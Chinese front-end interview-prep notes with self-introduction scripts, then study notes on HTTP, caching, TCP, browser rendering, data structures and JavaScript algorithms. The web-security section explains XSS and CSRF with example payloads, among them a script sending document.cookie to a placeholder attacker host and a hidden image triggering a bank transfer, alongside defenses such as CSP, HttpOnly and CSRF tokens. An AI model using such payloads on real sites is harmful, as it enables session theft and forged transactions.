# 自我介绍

## 技术官

**技术深度**

- 技术栈熟练度与匹配度

- 项目中技术落地的细节的难点

- 技术优化成果与能力沉淀

- 工具 / 框架的实际应用经验

面试官你好，我叫翟思丰，计算机科学与技术专业，23 年毕业，拥有 2 年多前端工作经验。

- 技术栈以**React、Next.js**为主，熟练掌握 TypeScript、Node.js，具备 Docker 项目打包与部署能力，能独立完成前端项目从开发到上线的全流程技术支撑。

- 主导跨境商城技术升级项目时，完成 Next.js 15 版本迁移、TypeScript 全量集成，以及包管理工具从 npm 到 pnpm 的迁移，直接将团队开发效率提升 30% 以上，减少依赖冲突问题 80%。

- 负责核心页面性能优化，通过图片懒加载、代码分割等方案，将首页 LCP（最大内容绘制）指标从 4.2s 降至 3s 以下，提升用户留存率约 12%；同时从 0 到 1 搭建 Shopify 应用开发、部署、上架全流程解决方案，已成功上架 2 款应用，每年可为公司节省第三方服务支出近 5 万元。

- 日常注重技术沉淀，搭建个人知识体系网站，梳理前端框架、性能优化等领域的实战经验；曾用 Node.js 开发多语种翻译文件读写服务，将运营团队的翻译整理效率提升 50%。

以上是我的技术相关经历，您想从哪个技术方向或项目细节深入了解？

## 部门负责人

**业务价值**

- 技术对业务的支撑与推动作用

- 项目成果对团队 / 公司的实际价值

- 跨角色协作能力与问题解决思路

- 对业务需求的理解与落地能力

面试官你好，我叫翟思丰，计算机科学与技术专业，23 年毕业，有 2 年多前端工作经验，核心优势是 “能以技术落地业务需求，为团队创造实际价值”。

- 主导跨境商城技术升级时，通过 Next.js 15 迁移与工具链优化，不仅让团队迭代效率提升 30%，更支撑了商城季度上新频次从 12 次增至 18 次，助力季度 GMV 增长 15%；同时解决了旧版本兼容性问题，减少用户因页面卡顿导致的流失率约 8%。

- 从 0 到 1 搭建 Shopify 应用开发体系，摆脱了收费应用的依赖，还通过上架 “印名印号”“黑名单拦截下单” 2 款应用，每年可为公司节省第三方服务支出近 5 万元，后续可推动应用出海，为公司开辟新业务方向。

- 跨团队协作中，能快速对接业务、运营需求：比如性能优化项目中，联动产品团队梳理用户核心访问路径，联合设计团队压缩图片资源，最终将首页 LCP 缩短 1s+；用 Node.js 开发的翻译工具，直接简化了运营团队多语种内容的整理流程，节省人工成本。

你想从哪方面开始了解呢？

## HR

**软技能与适配性导向**

- 职业稳定性与发展路径

- 软技能（沟通、学习、协作等）

- 对公司文化 / 岗位的认同度

- 个人特质与团队的契合度

  

面试官你好，我叫翟思丰，计算机科学与技术专业，23 年毕业，目前有 2 年多前端工作经验，职业规划是深耕前端领域，从 “技术实现者” 向 “业务赋能者” 发展。

- 职业路径清晰，从基础开发到能独立负责项目模块，核心技术栈以 React、Next.js 为主，同时注重技能拓展，自学 Docker 部署、Node.js 工具开发，快速适配团队需求。

- 具备较强的**解决问题能力**和**团队意识**：比如通过技术升级提升团队效率，通过性能优化改善用户体验，还曾从 0 到 1 搭建 Shopify 应用体系，为公司降本增效。

- 平时有知识沉淀习惯，搭建了个人知识网站，巩固自身技能，也方便和同事分享；沟通上能快速对接技术、业务、运营等不同角色的需求。

  我很认同公司在 [可提 1 个公司业务 / 文化相关点，如 “跨境领域的技术创新”] 上的布局，也希望能加入团队贡献力量，您想了解我的职业规划或其他方面吗？

# 计算机网络



## Http

### Http 协议

Http（超文本传输协议）是一种用于传输超文本（例如 HTML 文档）的**应用层协议**；

Http 是**基于 TCP/IP**协议的，是一种**无状态**的请求-响应协议;

Http/1.1 和 Http/2 是比较常见的版本，其中**Http/2**具有更高的性能；

### Http/1.0 和 Http/1.1 区别

- **连接方面**：1.0 默认使用非持久连接，而 1.1 默认使用持久连接。通过使用持久连接来使用多个 http 请求**复用同一个 TCP 连接**，避免使用非持久连接每次需要建立连接的**时延**
- **资源请求方面**，在 1.0 中存在一些**浪费宽带**的现象，例如客户端只是需要对象的某个部分，而服务器却将整个对象送过来了，并且**不支持断点续传**功能。1.1 则在请求头引入**range 头域**，它允许值请求某个部分，返回码是 206（Partial Control），这样就方便开发者自由的选择以便于充分利用宽带和连接。
- **缓存方面**，在 1.0 主要使用请求头的**If-Modified-Since**、**Expires**来作为缓存判断的标准，而 1.1 引入更多的缓存控制策略，例如**Etag**、**If-UNmodified-Since**、**If-Match**、**If-None-Match**等多种可供选择的字段控制缓存策略

### Http/1.1 和 Http/2.0 区别

- **二进制协议**，2.0 是一个彻底的二进制协议，请求头和请求体都是二进制，在 1.1 中，请求头必须是文本（ASCII 编码），请求体可以是文本，也可以是二进制。
- **多路复用**，2.0 仍然**复用 TCP 连接**，但是在一个连接里，客户端和服务器端都可以同时发送多个请求或响应，而且不用按照顺序发送一一发送，这样就避免了**队头堵塞**的问题
- **服务器推送**，不用客户端请求，可以**主动向客户端发送资源**。主动给客户端推送一些必要的资源，可以相对减少一些延迟时间。不过注意，推送的是静态资源，和 WebSocket 推送的即时数据是不同的。
- **头信息压缩**，由于**1.1 协议不带状态**，每次请求必须携带所有信息，所以请求的**很多字段是重复的**，比如 cookies 和 User-Agent。这样存在**浪费宽带**的问题，也影响响应速度。而 2.0 引入了头信息压缩机制，一方面，头信息使用**gzip**或**compress**压缩后再发送；另一方面，客户端和服务器同时维护一张头信息表，所有的字段都会存入这个表，生成一个**索引号**，以后就不发送同样字段了，**只发送索引号**，这样就能提高速度了。

### http 和 https 区别

- **安全性**：http是明文传输，存在信息窃听、篡改、劫持等风险；而https在http的基础上加入了SSL/TLS协议（在http和tcp中间加了一层），提供了数据加密、服务器认证、消息完整性等安全保障；
- **端口号**：http默认使用80，https默认使用443；
- **证书**：使用https需要购买SSL证书，并服务器上进行配置，而http则不需要；

### Http 请求和响应

客户端通过发送 http 请求向服务器请求资源。请求包括**请求行**、**请求头**和**请求体**；

请求行包括**http 方法**、**请求 url**和**http 版本**；

服务器收到请求后，会处理并返回 http 响应。响应包括**状态行**、**响应头**和**响应体**；

状态行包括**http 版本**、**状态码**和**状态描述**；

### 状态码

常见状态码

### Http 方法

常见的有：

- GET: 获取资源
- POST: 提交资源或数据
- PUT: 更新资源
- DELETE: 删除资源
- HEAD: 类型 GET，但只返回响应头
- OPTIONS: 查询服务器支持的 http 方法

### GET和POST区别

- **参数位置**：get请求的参数附加在**Url之后**，而post将参数放到**请求体**中；
- **幂等性**：get请求是幂等的，无论请求多少次，结果都是相同的；而post则不是，每次请求都可能导致不同结果；
- **历史记录**：get请求的Url会被浏览器保存在历史记录中，post则不会；
- **数据类型**:  get请求只允许发送**ascii字符**，而post则没限制；
- **数据大小**：由于浏览器和服务器对Url长度有限制，因此get的参数大小是有限制的，而post理论上没有；

### 请求头和响应头

请求头和响应头是**键值对**的集合，用于提供其关于请求和响应的**附加信息**；

常见的请求头有：

- Accept：客户端可接受的**MIME 类型**
- Accept-Encoding：客户端可接受的**编码方式**
- Authorization：用于**身份验证**的凭证
- Content-Type：**请求体**的 MIME 类型
- User-Agent：**客户端**的类型和版本信息

常见的响应头有：

- Content-Type：响应体的 MIME 类型
- Content-Length：响应体的字节长度
- Content-Encoding：响应体和编码方式
- Set-Cookie：设置客户端的 cookie
- Cache-Control：**缓存**控制指令

### 跨域

跨域是指客户端请求与资源所在服务器不同源的资源。浏览器的同源政策限制了跨域请求。为了解决跨域问题，可以使用一下方法：

- **CORS**（跨域资源共享）：服务器通过设置**Access-Control-Allow-Origin**等响应头，允许客户端跨域访问；
- **JSONP**（JSON with Padding）：客户端通过添加<script>标签请求资源，服务器返回**包含 JSON 数据的 JavaScript 代码**。不过这种方法**仅适用于 GET 请求**；
- 第三方代理。

### 缓存

HTTP 缓存是浏览器和服务器通过约定的 **HTTP 头字段** 实现的 “本地存储资源、重复请求时复用” 的机制，核心目标是 **减少服务器请求次数、降低带宽消耗、加快页面加载速度**。它分为 **强缓存** 和 **协商缓存** 两类，触发顺序是 “先强缓存，再协商缓存”，整个过程由浏览器自动完成，无需开发者手动干预。

两者的核心区别是 **“是否需要向服务器发请求”**—— 强缓存命中时完全不发请求，协商缓存必须发请求确认资源是否过期。

#### 强缓存：本地直接复用，不发请求

强缓存由 **响应头** 控制，浏览器首次请求资源后，会将资源和缓存规则（如 “有效期”）存到本地（内存 / 磁盘）。再次请求时，先检查本地缓存是否在有效期内：

- 若在有效期内（命中强缓存）：直接从本地读取资源，不向服务器发任何请求，浏览器控制台显示 `200 OK (from memory cache)` 或 `200 OK (from disk cache)`；
- 若已过期（未命中强缓存）：进入协商缓存流程。

**控制强缓存的核心响应头**（优先级：`Cache-Control` > `Expires`）

#### 协商缓存：发请求确认，决定是否复用

强缓存未命中时，浏览器会向服务器发 **带缓存标识的请求**，由服务器判断资源是否有更新：

- 若资源未更新（命中协商缓存）：服务器返回 `304 Not Modified`，不返回资源内容，浏览器直接复用本地缓存；
- 若资源已更新（未命中协商缓存）：服务器返回 `200 OK` 和最新资源，浏览器更新本地缓存。

**控制协商缓存的 “请求头 - 响应头” 配对**（两组标识，优先级：`ETag/If-None-Match` > `Last-Modified/If-Modified-Since`）：

#### HTTP 缓存完整流程（首次请求 → 再次请求）

以 “浏览器请求 `https://xxx.com/style.css`” 为例，完整交互过程如下：

**1.首次请求：无本地缓存，从服务器获取资源**

1. 浏览器发起 HTTP GET 请求 `style.css`，请求头无缓存相关字段；
2. 服务器接收请求，返回 `200 OK`，同时在响应头中携带缓存规则（如 `Cache-Control: max-age=3600`）和协商缓存标识（如 `ETag: "abc123"`、`Last-Modified: ...`）；
3. 浏览器接收响应：
   - 存储 `style.css` 的内容到本地缓存（内存或磁盘，大文件存磁盘，小文件存内存）；
   - 存储响应头中的缓存规则和协商缓存标识，与资源关联；
4. 浏览器渲染页面，使用 `style.css`。

**2.再次请求：先查强缓存，再查协商缓存**

分三种情况：

- 情况 1：强缓存命中（最理想，不发请求）

  - 浏览器检查本地缓存：`style.css` 的缓存有效期（`max-age=3600`）未过；
  - 直接从本地读取 `style.css`，不向服务器发请求；
  - 控制台显示 `200 OK (from memory cache)` 或 `200 OK (from disk cache)`。

- 情况 2：强缓存未命中，但协商缓存命中（发请求，不返回资源）

  - 浏览器检查本地缓存：`style.css` 的 `max-age` 已过（强缓存未命中）；

  - 浏览器发起请求，在请求头中携带协商缓存标识：

    ```http
    GET /style.css HTTP/1.1
    Host: xxx.com
    If-None-Match: "abc123"  # 携带上次的 ETag
    If-Modified-Since: Wed, 25 Sep 2024 10:00:00 GMT  # 携带上次的 Last-Modified
    ```

  - 服务器对比标识：`style.css` 内容未变（ETag 仍为 `"abc123"`）；

  - 服务器返回 `304 Not Modified`，响应头无资源内容，仅可能更新缓存规则（如延长 `max-age`）；

  - 浏览器复用本地缓存的 `style.css`，并更新缓存有效期。

- 情况 3：强缓存、协商缓存均未命中（发请求，返回新资源）

  - 浏览器检查本地缓存：`max-age` 已过（强缓存未命中）；
  - 浏览器发起请求，携带协商缓存标识；
  - 服务器对比标识：`style.css` 内容已变（ETag 变为 `"def456"`）；
  - 服务器返回 `200 OK`，响应头携带新的 `Cache-Control`、`ETag`、`Last-Modified`，响应体是最新的 `style.css`；
  - 浏览器更新本地缓存（覆盖旧资源和缓存规则），使用新资源渲染页面。

#### 常见资源的缓存策略

- 静态资源（JS/CSS/ 图片）：用 **强缓存为主，协商缓存为辅**，设置较长 `max-age`（如 1 年），配合 “文件哈希命名”（如 `style.abc123.css`）—— 资源更新时哈希变，浏览器认为是新资源，自动绕过缓存；
- 动态资源（接口数据、HTML）：用 **协商缓存为主，不启用强缓存**，设置 `Cache-Control: no-cache`，确保每次都向服务器确认是否有更新（如接口返回的商品库存、新闻列表）。

## TCP

- 三次握手

### 3次握手

TCP建立连接需要知道客户端和服务器知道对方准备好通信；

1. SYN发送：客户端发送一个SYN包到服务器，请求建立连接。这个包有**客户端的初始序列号**（就像客户端对服务器说：“你好，我想建立连接”）；
2. SYN收到-ACK发送：服务器收到SYN包后，会发送SYN-ACK包作为响应。这个包有**服务器的初始序列号**和**对客户端初始序列号的确认**（就像服务器对客户端说：“你好，我收到你的请求了，你准备好了吗？”）；
3. ACK发送：客户端收到SYN-ACK包后，会发送一个ACK包到服务器。这个包有**对服务器初始序列号的确认**（就像客户端对服务器说：“我准备好了，我们可以开始了。”）；



## Web 安全

### XXS

Cross-Site Scripting **跨站脚本攻击**

#### 核心原理

XSS 的本质是**攻击者在网页中注入恶意 JavaScript 代码**，当用户访问被注入的页面时，恶意代码会在用户的浏览器中执行，从而窃取用户数据（如 Cookie、Session）、伪造用户操作（如点击、表单提交）或篡改页面内容。

核心前提：**网页对用户输入的内容未做严格过滤 / 转义**，导致恶意代码被当作正常内容渲染执行。

#### 常见类型及案例

**存储型 XSS（持久化 XSS）**

原理：恶意代码被**存储到服务器**（如数据库、评论区、用户资料），所有访问该页面的用户都会触发。

案例：某论坛允许用户发布评论，攻击者在评论框输入：

```js
<script>
  // 窃取当前用户的Cookie并发送到攻击者服务器
  fetch('http://攻击者.com/steal?cookie=' + document.cookie);
</script>
```

若论坛后端未过滤该内容，直接存入数据库，那么所有查看该评论的用户，浏览器都会执行这段脚本，导致 Cookie 被窃取（若 Cookie 包含登录状态，攻击者可伪造登录）。

**反射型 XSS（非持久化 XSS）**

原理：恶意代码通过**URL 参数、表单提交**等方式 “反射” 给用户，仅在单次请求中生效，不存储到服务器。

案例：某网站的搜索功能通过 URL 参数传递关键词，如：`http://xxx.com/search?query=关键词`，页面会显示 “搜索结果：关键词”。

攻击者构造恶意 URL：

```js
http://xxx.com/search?query=<script>alert(document.cookie)</script>
```

当用户点击该 URL 时，页面会将`query`参数的值直接渲染到 HTML 中，导致`<script>`标签内的代码执行，弹出当前用户的 Cookie。

**DOM 型 XSS**

原理：恶意代码不经过服务器，直接通过**前端 JavaScript 操作 DOM**触发（如使用`innerHTML`、`location.hash`等拼接 HTML）。

案例：某页面的 JS 代码如下（用于显示 URL 中的哈希值）：

```js
// 从URL的hash中获取内容并渲染到页面
const content = location.hash.slice(1); // 如URL为#<img src=x onerror=alert(1)>
document.getElementById('box').innerHTML = content; 
```

攻击者构造 URL：`http://xxx.com/#<img src=x onerror=alert('XSS')>`，用户访问后，JS 会将 hash 中的内容直接通过`innerHTML`插入页面，触发`onerror`事件执行恶意代码。

#### **防御**

核心原则：**对用户输入 “过滤”，对输出到页面的内容 “编码”**，禁止恶意脚本执行。

- **输入过滤**：对用户输入的特殊字符（如`<`、`>`、`'`、`"`、`&`）进行过滤或转义（如`<`转义为`<`，`>`转义为`>`）。推荐使用成熟库（如`DOMPurify`）净化 HTML 内容，避免手动处理遗漏。

- **输出编码**：当动态内容渲染到页面时，根据上下文（HTML 标签内、属性内、JS 代码内）进行对应编码。例如：React/Vue 等框架默认会对文本内容自动转义（避免直接使用`dangerouslySetInnerHTML`或`v-html`）

- **启用 CSP（内容安全策略）**：通过 HTTP 响应头`Content-Security-Policy`限制脚本的加载和执行：

  ```http
  Content-Security-Policy: script-src 'self' https://trusted.com; object-src 'none'
  ```

  上述配置仅允许加载自身域名和`trusted.com`的脚本，禁止内联脚本（`<script>`标签内容）和`eval()`，从根源阻止 XSS 执行。

- **保护 Cookie**：

  对包含登录状态的 Cookie 设置`HttpOnly`属性（禁止 JS 访问，防止被 XSS 窃取）和`Secure`属性（仅通过 HTTPS 传输）：

  ```http
  Set-Cookie: sessionid=xxx; HttpOnly; Secure; SameSite=Lax
  ```

  

### CSRF

Cross-Site Request Forgery，跨站请求伪造

#### 核心原理

CSRF 的本质是**攻击者诱导已登录的用户，在不知情的情况下向目标服务器发送恶意请求**，利用用户的登录状态（如 Cookie 中的 SessionID）让服务器误以为是用户的合法操作。

核心前提：**服务器仅通过用户的登录状态（如 Cookie）验证请求合法性，未验证请求的 “真实意愿”**。

#### 案例

假设用户已登录某银行网站（`http://bank.com`），浏览器保存了银行的登录 Cookie（`sessionid=xxx`）。

攻击者搭建恶意网站（`http://evil.com`），页面中隐藏一个自动提交的表单或图片请求：

```html
<!-- 恶意页面中的转账请求 -->
<img src="http://bank.com/transfer?to=攻击者账号&amount=10000" style="display:none">
```

当用户在登录银行后，又访问了`http://evil.com`，浏览器会自动向`http://bank.com`发送请求，且会**携带银行的登录 Cookie**。银行服务器因检测到用户已登录，会执行转账操作，导致用户资金损失。

#### 防御

核心原则：**让服务器能区分 “用户主动发起的请求” 和 “攻击者伪造的请求”**。

- **使用 CSRF Token**：

  - 服务器在用户登录后，生成一个随机、唯一的`csrf_token`（与用户 Session 绑定），并返回给客户端（如嵌入表单隐藏域或存储在 Cookie 中）
  - 客户端发送请求时（如表单提交、API 调用），必须携带该`csrf_token`（如放在请求头`X-CSRF-Token`或表单字段中）
  - 服务器接收请求后，验证`csrf_token`是否与用户 Session 中的一致，不一致则拒绝请求

  例如：表单中携带 Token：

  ```html
  <form action="/transfer" method="post">
    <input type="hidden" name="csrf_token" value="随机生成的token">
    <input type="text" name="to" value="目标账号">
    <input type="text" name="amount" value="金额">
  </form>
  ```

- **设置 SameSite Cookie 属性**：为登录 Cookie 设置`SameSite`属性，限制跨站请求携带 Cookie：

  - `SameSite=Strict`：仅同站请求（同一域名）可携带 Cookie，完全禁止跨站请求。

  - `SameSite=Lax`：允许部分跨站请求（如 GET 请求从外部链接跳转），但禁止 POST 等修改数据的请求。配置示例：

    ```http
    Set-Cookie: sessionid=xxx; SameSite=Strict; HttpOnly; Secure
    ```

- **验证 Referer/Origin 请求头**：服务器检查请求的`Referer`（完整来源 URL）或`Origin`（来源域名），仅允许来自可信域名（如自身域名）的请求。例：若服务器域名是`bank.com`，则拒绝`Referer`为`evil.com`的请求。

# 浏览器

## 存储

### cookie和localstorage

#### 区别

| 特性             | cookie                                                       | localStorage                                                 |
| ---------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| **存储大小**     | 较小（约 4KB），适合存储少量数据                             | 较大（通常 5MB，不同浏览器略有差异），可存更多数据           |
| **生命周期**     | 可设置过期时间（`expires` 或 `max-age`），过期后自动删除；若不设置，则为会话级（关闭浏览器后删除） | 持久化存储，除非手动删除（代码删除或清除浏览器数据），否则永久存在 |
| **与服务器交互** | 每次 HTTP 请求（同域名）会自动携带在请求头中，参与服务器通信 | 仅在客户端存储，不参与服务器交互，不会随请求发送             |
| **API 易用性**   | 需通过 `document.cookie` 操作，需手动处理字符串解析（如键值对、过期时间等），较繁琐 | 提供简洁 API：`setItem(key, value)`、`getItem(key)`、`removeItem(key)` 等，操作直观 |
| **安全性**       | 支持 `HttpOnly`（禁止 JS 访问，防 XSS）、`Secure`（仅 HTTPS 传输）、`SameSite`（防 CSRF）等安全属性 | 无安全属性，可被 JS 直接访问，若页面存在 XSS 漏洞，数据易被窃取 |
| **访问范围**     | 可通过 `domain` 和 `path` 限制访问（如子域名可访问父域名的 cookie） | 严格遵循同源策略（协议、域名、端口必须完全一致），非同源页面无法访问 |

#### **选型**

**优先选 `cookie` 的场景**

- **需要与服务器交互的数据**：例如身份认证的 `token`、用户登录状态等，cookie 会自动随请求发送到服务器，无需手动处理。
- **敏感数据**：通过设置 `HttpOnly`（防止 JS 读取，规避 XSS 风险）、`Secure`（仅 HTTPS 传输）等属性，可提升安全性。
- **需要控制过期时间的数据**：例如临时登录状态（设置 2 小时过期），无需手动清理，过期后自动失效。
- **跨子域名共享数据**：通过配置 `domain` 属性（如 `domain=.example.com`），可实现主域名与子域名间的数据共享。

**优先选 `localStorage` 的场景**

- **仅客户端使用、无需发送到服务器的数据**：例如用户本地配置（主题偏好、列表排序方式）、本地缓存的非敏感数据（如商品列表缓存）。
- **数据量较大的场景**：超过 4KB 的数据（如复杂的表单草稿、离线数据），cookie 无法满足存储需求。
- **需要持久化存储的数据**：希望关闭浏览器后数据不丢失（如用户的历史操作记录），且无需频繁清理。

**sessionStorage：会话级存储**

- **核心特点**：仅在当前标签页生效，标签页关闭后数据消失，容量约 5-10MB，不跨页面共享。

- **典型场景**：临时保存表单草稿（如用户填写一半的信息）、存储当前页面的临时状态（如分页页码）。

  

### 浏览器垃圾回收机制

### 哪些情况会导致内存泄漏



## 原理

### 白屏到有内容过程，该怎么缩短

整个过程可分为**网络请求→资源处理→渲染渲染**三大阶段，具体步骤如下：

#### 网络请求阶段

- **DNS 解析**：将域名（如`www.example.com`）转换为 IP 地址（如`192.168.1.1`），浏览器需向 DNS 服务器查询。
- 建立连接
  - TCP 握手：客户端与服务器建立 TCP 连接（3 次握手）。
  - 若用 HTTPS，还需 TLS 握手：协商加密算法、交换证书等（额外 1-2 次往返）。
- **服务器处理（TTFB）**：服务器接收请求后，处理业务逻辑（如查数据库、渲染页面），返回首个字节（TTFB，Time to First Byte）。

**优化手段：**

- DNS优化
  - 用**DNS 预解析**：在`<head>`中添加`<link rel="dns-prefetch" href="https://cdn.example.com">`，提前解析第三方域名（如 CDN、接口域名）
  - 缩短 DNS 缓存时间：通过域名服务商设置合理的 TTL（如 5 分钟），减少重复解析

- 链接优化
  - 启用**HTTP/2 或 HTTP/3**：多路复用（多个请求共用一个连接）、减少握手次数（HTTP/3 基于 QUIC，跳过 TCP 握手）。
  - 部署**HTTPS 时优化 TLS**：使用 TLS 1.3（握手次数从 2 次减为 1 次）、启用 OCSP stapling（减少证书验证步骤）。
  - 选择**全球 CDN**：将静态资源（HTML、CSS、JS、图片）部署到离用户最近的 CDN 节点，减少物理距离延迟。
- 减少TTFB
  - 用**静态生成（SSG）**：如 Next.js 的`getStaticProps`，提前在构建时生成 HTML，服务器直接返回（TTFB 接近 0）。
  - 缓存动态内容：对频繁访问的动态页面，用 Redis 等缓存结果（如用户首页数据缓存 10 分钟）。
  - 优化服务器性能：升级服务器配置、减少数据库慢查询（加索引）、用边缘计算（如 Vercel Edge Functions）处理简单请求。

#### 资源下载与解析

- **下载关键资源**：浏览器优先下载 HTML（入口文件），再根据 HTML 中的`link`（CSS）、`<script>`（JS）、`<img>`等标签下载其他资源。
  - 注意：CSS 会阻塞渲染（需构建 CSSOM），同步 JS（无`async`/`defer`）会阻塞 HTML 解析和渲染。
  
- **构建 DOM 树**：解析 HTML，将标签转换为 DOM 节点（树状结构，描述页面内容）。

- **构建 CSSOM 树**：解析 CSS，生成 CSSOM（描述样式规则，用于计算元素最终样式）。

- 优化**执行关键 JS**：若 JS 操作 DOM/CSSOM（如`document.write`、修改样式），会阻塞后续解析 / 渲染（需等待 JS 执行完成）。



**优化手段**：

- 减少资源体积
  - 压缩 HTML/CSS/JS：用 Webpack 的`terser-webpack-plugin`压缩 JS，`css-minimizer-webpack-plugin`压缩 CSS，HTML 用`html-minifier`去除空格。
  - 图片优化：用 WebP/AVIF 格式（比 JPEG 小 50%）、按显示尺寸加载（如`<img src="img-400w.jpg" srcset="img-400w.jpg 400w, img-800w.jpg 800w" sizes="(max-width: 600px) 400px, 800px">`）。
  - 代码分割：用 React 的`React.lazy`、Next.js 的`dynamic`拆分非首屏代码，只加载当前页面必需的 JS。

- 减少阻塞资源
  - 内联**关键 CSS**：将首屏必需的 CSS（如导航、主标题样式）直接写在`<style>`标签中（避免外部 CSS 文件的网络请求阻塞渲染），非关键 CSS（如页脚、弹窗）异步加载（`media="print"`或动态导入）。
  - 延迟非关键 JS：对不影响首屏的 JS（如统计、广告），加`async`（下载不阻塞解析，下载完立即执行）或`defer`（下载不阻塞解析，解析完再执行），或用`requestIdleCallback`在浏览器空闲时加载。
  - 避免同步 JS 阻塞：将`<script>`放在`</body>`前，或用`type="module"`（默认延迟执行，类似`defer`）。



#### 渲染阶段

- **生成渲染树（Render Tree）**：结合 DOM 和 CSSOM，过滤不可见元素（如`display: none`），保留可见元素及其样式。
- **布局（Layout）**：计算渲染树中元素的位置和大小（也称 “重排”），是耗时操作（尤其元素多或嵌套深时）。
- **绘制（Paint）**：根据布局结果，将元素的像素绘制到屏幕（如颜色、阴影，也称 “重绘”）。
- **合成（Composite）**：将绘制的图层合并为最终屏幕图像（浏览器会将复杂页面分层，优化绘制效率）。



**优化手段**：

- **简化首屏 DOM**：首屏只保留必要元素（如导航、主内容），非首屏内容（如评论、推荐）用懒加载（滚动到可视区再渲染）。

- **避免布局抖动**：首屏渲染时，避免 JS 频繁修改 DOM（如多次`offsetHeight`读取 + 样式修改），集中一次修改（用`requestAnimationFrame`批量处理）。

- **优先渲染文本**：若首屏 LCP 元素是文本，确保字体提前加载（如用`font-display: swap`让系统字体先显示，避免无样式文本闪烁）。

- **使用骨架屏**：在内容加载完成前，显示与最终布局一致的骨架屏（减少用户对 “白屏” 的感知），如：

  ```html
  <!-- 骨架屏示例 -->
  <div class="skeleton">
    <div class="skeleton-title"></div>
    <div class="skeleton-content"></div>
  </div>
  ```

- #### 监控与迭代

  - 用**Lighthouse**（Chrome 开发者工具）审计，查看 “首次内容绘制（FCP）”“最大内容绘制（LCP）” 的具体瓶颈（如 “长任务阻塞”“资源下载慢”）。
  - 接入**真实用户监控（RUM）**：如用`web-vitals`库收集用户实际访问数据，针对性优化弱网、低端设备的体验。

## webwork

#### 了解webworker吗？

# 操作系统

- 进程
- 线程

## 进程

**并发执行的程序**在执行过程中分配和管理资源的基本单位，是一个**动态**概念，竞争计算机资源的基本单位

## 线程

是进程的一个执行单元；

**何时使用多进程，何时使用多线程？**

对资源的管理和保护要求高，**不限制开销和效率**时，使用**多进程**；

要求**效率高**，**切换频繁**时，资源的保护管理要求不是很高时，使用**多线程**；

# 数据结构

- 树

## 树

树可以描述现实生活的一些事物，比如**家谱**、**单位组织结构**等等；

### 相关术语

- 节点的度（degree）：节点的**子树个数**
- 树的度：树的所有**节点中最大的度数**
- 叶子节点（leaf）：**度为 0 的节点**，也叫叶子节点

### 二叉树

#### 重要特性

![image-20220316094155986](C:\Users\86131\Desktop\know_fragments\md-img\image-20220316094155986.png)

- 一个二叉树**第 i 层**的**最大节点数**为**2^(i-1)**
- **深度为 k**的二叉树有最大节点总数为**2^k-1**
- 对于任何非空二叉树 T，若 n0 表示**叶子节点的个数**，n2 表示**度为 2 的非叶子节点个数**，两者满足**n0 = n2 + 1**

# 算法

## 3个乘积最大

```js
/**
 * 题目：给定一个整数数组，有负数，求出该数组中任意三个数的乘积最大值
 *
 * 解题思路：
 * 1. 由于存在负数，三个数乘积最大值可能出现在：
 *    - 三个最大正数相乘
 *    - 两个最小负数（绝对值最大）与最大正数相乘
 * 2. 排序后比较两种情况取最大值
 *
 * 时间复杂度：O(n log n) - 主要是排序的复杂度
 * 空间复杂度：O(1) - 只使用常数额外空间
 */

/**
 * 方法一：排序法（推荐）
 * @param {number[]} nums 整数数组
 * @returns {number} 三个数乘积的最大值
 */
function maximumProduct(nums) {
  // 边界条件检查
  if (nums.length < 3) {
    throw new Error("数组长度必须至少为3");
  }

  // 升序排序
  nums.sort((a, b) => a - b);

  const n = nums.length;

  // 比较两种情况：
  // 1. 三个最大数相乘
  const case1 = nums[n - 1] * nums[n - 2] * nums[n - 3];

  // 2. 两个最小数（可能是负数）与最大数相乘
  const case2 = nums[0] * nums[1] * nums[n - 1];

  return Math.max(case1, case2);
}

/**
 * 方法二：一次遍历法（空间优化）
 * 时间复杂度：O(n)
 * 空间复杂度：O(1)
 * @param {number[]} nums 整数数组
 * @returns {number} 三个数乘积的最大值
 */
function maximumProductOptimized(nums) {
  // 维护最大的三个数和最小的两个数
  let max1 = -Infinity,
    max2 = -Infinity,
    max3 = -Infinity;
  let min1 = Infinity,
    min2 = Infinity;

  for (const num of nums) {
    // 更新最大的三个数
    if (num > max1) {
      max3 = max2;
      max2 = max1;
      max1 = num;
    } else if (num > max2) {
      max3 = max2;
      max2 = num;
    } else if (num > max3) {
      max3 = num;
    }

    // 更新最小的两个数
    if (num < min1) {
      min2 = min1;
      min1 = num;
    } else if (num < min2) {
      min2 = num;
    }
  }

  // 比较两种情况
  return Math.max(max1 * max2 * max3, min1 * min2 * max1);
}

// 测试用例
function testMaximumProduct() {
  const testCases = [
    [1, 2, 3], // 正数：6
    [1, 2, 3, 4], // 正数：24
    [-1, -2, -3], // 全负数：-6
    [-4, -3, -2, -1, 60], // 混合：720 (-4 * -3 * 60)
    [-1, -2, 1, 2, 3], // 混合：6 (-1 * -2 * 3)
    [0, 1, 2], // 包含0：2
    [-10, -10, 5, 2], // 负数较多：500 (-10 * -10 * 5)
  ];

  console.log("=== 测试结果 ===");
  testCases.forEach((nums, index) => {
    const result1 = maximumProduct([...nums]);
    const result2 = maximumProductOptimized([...nums]);
    console.log(`测试${index + 1}: [${nums.join(", ")}]`);
    console.log(`排序法结果: ${result1}`);
    console.log(`优化法结果: ${result2}`);
    console.log(`结果一致: ${result1 === result2}`);
    console.log("---");
  });
}

testMaximumProduct();

```

## 有序数组找索引

```js
/**
 * 二分查找算法 - 在有序数组中查找目标元素的索引
 * @param {number[]} arr - 有序数组（升序）
 * @param {number} target - 目标元素
 * @returns {number} 目标元素的索引，如果不存在返回-1
 */
const binarySearch = (arr, target) => {
  let left = 0;
  let right = arr.length - 1;

  while (left <= right) {
    const mid = Math.floor((left + right) / 2);

    if (arr[mid] === target) {
      return mid;
    } else if (arr[mid] < target) {
      left = mid + 1;
    } else {
      right = mid - 1;
    }
  }

  return -1; // 未找到目标元素
};

/**
 * 二分查找算法 - 递归实现版本
 * @param {number[]} arr - 有序数组（升序）
 * @param {number} target - 目标元素
 * @param {number} left - 左边界
 * @param {number} right - 右边界
 * @returns {number} 目标元素的索引，如果不存在返回-1
 */
const binarySearchRecursive = (
  arr,
  target,
  left = 0,
  right = arr.length - 1
) => {
  if (left > right) {
    return -1; // 未找到目标元素
  }

  const mid = Math.floor((left + right) / 2);

  if (arr[mid] === target) {
    return mid;
  } else if (arr[mid] < target) {
    return binarySearchRecursive(arr, target, mid + 1, right);
  } else {
    return binarySearchRecursive(arr, target, left, mid - 1);
  }
};

// 测试用例
const testArray = [1, 3, 5, 7, 9, 11, 13, 15, 17, 19];

console.log("测试数组:", testArray);
